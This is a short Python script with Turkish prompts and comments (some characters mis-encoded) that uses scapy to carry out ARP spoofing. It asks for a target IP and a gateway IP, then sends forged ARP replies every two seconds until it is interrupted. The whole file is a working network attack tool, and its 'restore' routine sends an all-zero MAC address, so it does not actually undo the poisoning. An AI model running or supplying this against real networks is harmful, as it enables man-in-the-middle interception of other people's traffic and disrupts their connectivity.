from scapy.all import ARP, send
import time

def sahte_arp_gonder(hedef_ip, sahte_ip):

    paket = ARP(op=2, pdst=hedef_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=sahte_ip)
    send(paket, verbose=False) 
    print(f"ARP sahte paketi gönderildi: {sahte_ip} -> {hedef_ip}")

def arp_tablo_yenile(hedef_ip, dogru_ip):
    
    paket = ARP(op=2, pdst=hedef_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=dogru_ip, hwsrc="00:00:00:00:00:00")
    send(paket, verbose=False, count=4)
    print(f"ARP tablosu eski haline döndürüldü: {dogru_ip} -> {hedef_ip}")

if __name__ == "__main__":

    hedef_ip = input("Hedef cihazýn IP adresini girin: ")
    sahte_ip = input("Sahte IP (örneðin, Gateway IP) girin: ")

    try:

        print("ARP Spoofing iþlemi baþlatýlýyor. Durdurmak için CTRL+C.")

        while True:
            sahte_arp_gonder(hedef_ip, sahte_ip)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\nARP Spoofing iþlemi durduruluyor...")
        arp_tablo_yenile(hedef_ip, sahte_ip)
